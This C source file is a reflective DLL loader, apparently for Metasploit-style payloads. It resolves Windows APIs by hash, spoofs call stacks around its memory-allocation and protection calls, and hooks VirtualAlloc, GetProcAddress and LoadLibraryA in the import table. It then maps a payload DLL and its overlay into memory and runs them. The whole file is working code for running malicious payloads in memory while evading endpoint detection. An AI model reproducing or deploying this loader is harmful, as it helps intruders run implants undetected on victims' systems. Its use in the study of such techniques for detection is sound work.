#include <Macros.h>
#include <Funcs.h>

SEC( text, B ) VOID Entry ( VOID )
{

	PRM 	p 			= { 0 };

	PVOID	MsfBase		= NULL;
	PVOID	pNtdll		= NULL;      
	PVOID	pK32		= NULL;

	PIMAGE_NT_HEADERS		NtHeaders		= NULL;
	PIMAGE_SECTION_HEADER   SecHeader       = NULL;
	PIMAGE_DATA_DIRECTORY   ImageDir        = NULL;

	PVOID	pLdrLoadDll		= NULL;
	PVOID	pNtAVM			= NULL;
	PVOID	pNtPVM			= NULL;
	PVOID	pLoadLib		= NULL;
	PVOID	pGetProcAddr	= NULL;

	PVOID   pAlloc			= NULL;  
	DWORD	DllSize			= NULL;
	DWORD64	TotalSize		= NULL;
	DWORD	OverlaySize		= NULL;
	PVOID	SecMemory       = NULL;
    PVOID	SecMemorySize   = 0;
    DWORD	Protection      = 0;
    ULONG	OldProtection   = 0;

	DWORD SizeOfLastRawSection		= 0;
	DWORD SumOfRawSectionSize		= 0;
	PVOID LastRawSection			= NULL;
	
	PrepSpoof( &p );

	MsfBase 	= KaynCaller();
	pNtdll		= LdrModulePeb( NTDLL_HASH );
	pK32		= LdrModulePeb( K32_HASH );

	pLdrLoadDll 	= LdrFunctionAddr( pNtdll, SYS_LDRLOADDLL );
	pNtAVM			= LdrFunctionAddr( pNtdll, SYS_NTALLOCATEVIRTUALMEMORY );
	pNtPVM			= LdrFunctionAddr( pNtdll, SYS_NTPROTECTEDVIRTUALMEMORY );
	pLoadLib		= LdrFunctionAddr( pK32, H_LOADLIBRARYA );
	pGetProcAddr	= LdrFunctionAddr( pK32, H_GETPROCADDRESS );

	NtHeaders		= (PVOID) ( MsfBase + ( ( PIMAGE_DOS_HEADER ) MsfBase )->e_lfanew );
	DllSize	  		= NtHeaders->OptionalHeader.SizeOfImage;

	// ---------------------------------------------------------------------------
	// Calculate the size of the Overlay 
	// Patched value contains the RDLL + Overlay Size
	// Total size - Sum of the raw size of sections + the offset to the first section = Overlay
	// ---------------------------------------------------------------------------

	
	OverlaySize		= *(int*) ( ( PBYTE ) MsfBase + 47 ); 							// Reflective DLL + Overlay size
	
	SecHeader 		= IMAGE_FIRST_SECTION( NtHeaders );
	for ( DWORD i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++ )
	{
		if ( i == NtHeaders->FileHeader.NumberOfSections - 1 )
		{
			LastRawSection			= MsfBase + SecHeader[ i ].PointerToRawData;
			SizeOfLastRawSection 	= SecHeader[ i ].SizeOfRawData;
		}
		SumOfRawSectionSize += SecHeader[ i ].SizeOfRawData;
	}
	OverlaySize 	-= SumOfRawSectionSize + SecHeader[ 0 ].PointerToRawData;		// Ignored everything PRE sections
	
	// ---------------------------------------------------------------------------
	// Total size in memory of the RDLL + Overlay
	// ---------------------------------------------------------------------------

	TotalSize 				= DllSize + OverlaySize;										
	

	if ( NT_SUCCESS( Spoof( (PVOID)(-1), &pAlloc, NULL, &TotalSize, &p, pNtAVM, (PVOID)2, (PVOID)MEM_COMMIT, (PVOID)PAGE_READWRITE) ) )
	{
		// ---------------------------------------------------------------------------
		// Copy DOS + NT Header
		// ---------------------------------------------------------------------------

		CopyMemoryEx( pAlloc, MsfBase, SecHeader[ 0 ].PointerToRawData );

		// ---------------------------------------------------------------------------
		// Copy headers and section into the new memory
		// ---------------------------------------------------------------------------

        for ( DWORD i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++ )
        {
            CopyMemoryEx(
                    pAlloc	+ SecHeader[ i ].VirtualAddress,    // Section New Memory
                    MsfBase + SecHeader[ i ].PointerToRawData, // Section Raw Data
                    SecHeader[ i ].SizeOfRawData               // Section Size
            );
        }
		
		// ---------------------------------------------------------------------------
		// Copy the overlay
		// ---------------------------------------------------------------------------

		CopyMemoryEx( (PBYTE)pAlloc + DllSize, LastRawSection + SizeOfLastRawSection, OverlaySize );

        // ----------------------------------
        // Process our images import table
        // ----------------------------------
		
        ImageDir = & NtHeaders->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_IMPORT ];


        if ( ImageDir->VirtualAddress )
		{
			PIMAGE_THUNK_DATA        OriginalTD        	= NULL;
			PIMAGE_THUNK_DATA        FirstTD           	= NULL;

			PIMAGE_IMPORT_DESCRIPTOR pImportDescriptor 	= NULL;
			PIMAGE_IMPORT_BY_NAME    pImportByName     	= NULL;

			PCHAR                    ImportModuleName  	= NULL;
			HMODULE                  ImportModule     	= NULL;

			LPVOID 					 Function			= NULL;
			for ( pImportDescriptor = pAlloc + ImageDir->VirtualAddress; pImportDescriptor->Name != 0; ++pImportDescriptor )
			{
				ImportModuleName =  pAlloc + pImportDescriptor->Name;
				//ImportModule     = KLoadLibrary( pLdrLoadDll, ImportModuleName, &p ); // Maybe check if PEB return valid pointer, then load if not?
				ImportModule 	= Spoof( ImportModuleName, NULL, NULL, NULL, &p, pLoadLib , (PVOID)0 );

				OriginalTD       = pAlloc + pImportDescriptor->OriginalFirstThunk;
				FirstTD          = pAlloc + pImportDescriptor->FirstThunk;

				for ( ; OriginalTD->u1.AddressOfData != 0 ; ++OriginalTD, ++FirstTD )
				{
					
					if ( IMAGE_SNAP_BY_ORDINAL( OriginalTD->u1.Ordinal ) )
					{
						// I wish I was smart enough to figure out how to import by ord without GetProcAddr
						
						PBYTE Module 		= ImportModule;
						DWORD ord			= OriginalTD->u1.Ordinal;
						Function			= Spoof( ImportModule, (DWORD64)ord, NULL, NULL, &p, pGetProcAddr, (PVOID)0 );
						if ( Function != NULL )
						 	FirstTD->u1.Function = Function;
					}
					
					else
					{
						pImportByName       = pAlloc + OriginalTD->u1.AddressOfData;
						DWORD  FunctionHash = HashString( pImportByName->Name, KStringLengthA( pImportByName->Name ) );
						if ( FunctionHash == H_VIRTUALALLOC)
						{
							Function		= GET_SYMBOL( VirtualAllocHook );
						}
						else if ( FunctionHash == H_GETPROCADDRESS )
						{
							Function		= GET_SYMBOL( GetProcAddressHook );
						}
						else if ( FunctionHash == H_LOADLIBRARYA )
						{
							Function		= GET_SYMBOL( LoadLibraryAHook );
						}										
						else
						{
							Function    	= LdrFunctionAddr( ImportModule, FunctionHash );
						}
						if ( Function != NULL )
							FirstTD->u1.Function = Function;
					}
				}
			}
		}
		

        // ----------------------------
        // Process image relocations
        // ----------------------------
		
        ImageDir = & NtHeaders->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BASERELOC ];
		
        if ( ImageDir->VirtualAddress )
            KaynLdrReloc( pAlloc, NtHeaders->OptionalHeader.ImageBase, (PVOID)( pAlloc + ImageDir->VirtualAddress ) );

        for ( DWORD i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++ )
        {
            SecMemory       = (PVOID) ( pAlloc + SecHeader[ i ].VirtualAddress );
            SecMemorySize   = SecHeader[ i ].SizeOfRawData;
            Protection      = 0;
            OldProtection   = 0;

            if ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_WRITE )
                Protection = PAGE_WRITECOPY;

            if ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_READ )
                Protection = PAGE_READONLY;

            if ( ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_WRITE ) && ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_READ ) )
                Protection = PAGE_READWRITE;

            if ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE )
                Protection = PAGE_EXECUTE;

            if ( ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_WRITE ) )
                Protection = PAGE_EXECUTE_WRITECOPY;

            if ( ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_READ ) )
                Protection = PAGE_EXECUTE_READ;

            if ( ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_WRITE ) && ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_READ ) )
                Protection = PAGE_EXECUTE_READWRITE;
				
			Spoof( (PVOID)(-1), &SecMemory, &SecMemorySize, (PVOID)Protection, &p, pNtPVM, (PVOID)1, &OldProtection );
		}

		BOOL ( WINAPI *DllMain ) ( PVOID, DWORD, PVOID ) = ( pAlloc + NtHeaders->OptionalHeader.AddressOfEntryPoint ) ;

		DllMain( pAlloc, DLL_PROCESS_ATTACH, NULL );

		DllMain( pAlloc, 4, LastRawSection + SizeOfLastRawSection );

	}
}
